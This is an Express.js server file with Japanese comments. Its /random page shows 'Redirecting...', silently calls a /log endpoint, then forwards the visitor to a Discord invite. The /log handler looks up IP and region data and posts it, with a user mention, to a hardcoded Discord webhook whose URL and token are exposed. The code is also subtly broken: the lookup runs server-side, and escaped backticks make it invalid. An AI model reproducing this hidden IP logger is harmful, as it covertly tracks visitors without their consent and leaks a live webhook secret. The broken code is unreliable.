import express from "express";
const app = express();

// メインのエントリポイント
app.get("/random", (req, res) => {
  res.send(`
    <html>
      <body>
        <p>Redirecting...</p>
        <script>
          // 自サーバーのログ用エンドポイントを叩く
          fetch("/log")
            .finally(() => {
              // ログ送信の成否に関わらず、一定時間後にリダイレクト
              setTimeout(() => {
                window.location.href = "https://discord.gg/ctkp-aarr";
              }, 500);
            });
        </script>
      </body>
    </html>
  `);
});

// Webhookを送信する専用のエンドポイント
app.get("/log", async (req, res) => {
  try {
    const ipRes = await fetch("https://ipinfo.io/json");
    const got = await ipRes.json();

    await fetch("https://discord.com/api/webhooks/1467086114245574657/q8IPAwByCouW4LJ_uwbbtsT1X8zJ9vdYA-6dmClQFhHiLxWFe6UZ5Gm9FjdDy8FI9qnf", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        content: \`\${got.ip} \${got.region} <@1238820524256268381>\` 
      })
    });
    res.status(200).send("OK");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error");
  }
});

app.listen(3000);
